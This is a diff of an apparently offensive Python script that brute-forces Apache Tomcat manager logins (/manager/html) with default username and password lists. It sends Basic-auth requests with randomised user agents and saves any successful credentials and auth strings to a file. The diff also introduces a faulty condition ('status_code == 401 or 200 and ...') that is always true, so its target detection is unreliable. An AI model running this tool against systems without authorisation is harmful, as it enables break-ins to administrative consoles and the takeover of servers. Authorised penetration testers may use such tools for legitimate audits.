@@ -12,15 +12,17 @@ def single_connect(args) -> str:
     """ Check if target is alive and try to connect with Apache Tomcat login page """
 
     target = args.u
-    path: str = f"{target}/manager/html"
+    url: str = f"{target}/manager/html"
 
     try:
-        response = get(path, **props)
+        response = get(url, **props)
         body: str = response.text
         status_code: str = response.status_code
 
-        detect = lambda success = 401 or 200: status_code == success and 'Tomcat' or 'tomcat' in body
-        (bruteforce(path)) if detect() else print(f"[red][-] Connection problems with {target} | {status_code} [/]")
+        if status_code == 401 or 200 and 'Tomcat' or 'tomcat' in body:
+            bruteforce(url)
+        else:
+            print(f"[red][-] Connection problems with {target} | {status_code} [/]")
 
     except Exception as e:
         return print(f"[red][-] An error happened: {e} [/]")
@@ -29,10 +31,11 @@ def single_connect(args) -> str:
         pass
 
 
-def bruteforce(path) -> str:
+def bruteforce(url) -> str:
     """ Bruteforce Apache Tomcat login with default credentials """
 
-    print(f"[yellow][!] Starting bruteforce on {path} [/]")
+    print(f"[bold yellow][*] Starting bruteforce on [bold white]{url}[/][/]")
+    print(f"[bold yellow][*] {len(get_usernames())} Usernames loaded. {len(get_passwords())} Passwords loaded.[/]")
 
     for u, p in zip(get_usernames(), get_passwords()):
 
@@ -47,13 +50,13 @@ def bruteforce(path) -> str:
 
         auth_header: str = { 'Authorization': auth_string, 'User-Agent': user_agent() }
 
-        response = get(path, verify=False, headers=auth_header)
+        response = get(url, verify=False, headers=auth_header)
         status_code: str = response.status_code
 
         if (status_code == 200):
-            print(f"[green][+] Login: {u+p} | URL: {path} | Cookie: {auth_string}\n [/]")
+            print(f"[green][+] Credentials ~ {u+p} | Cookie: {auth_string}\n[/]")
 
             with open("src/core/result/out.txt", "a+") as file:
-                file.write(f"{path} | {u+p} | {auth_string}")
+                file.write(f"{url} | {u+p} | {auth_string}")
 
-    print(f"[yellow][!] Bruteforce in {path} is done.\n [/]")
+    print(f"[bold white][*] Bruteforce in {url} is done.\n[/]")
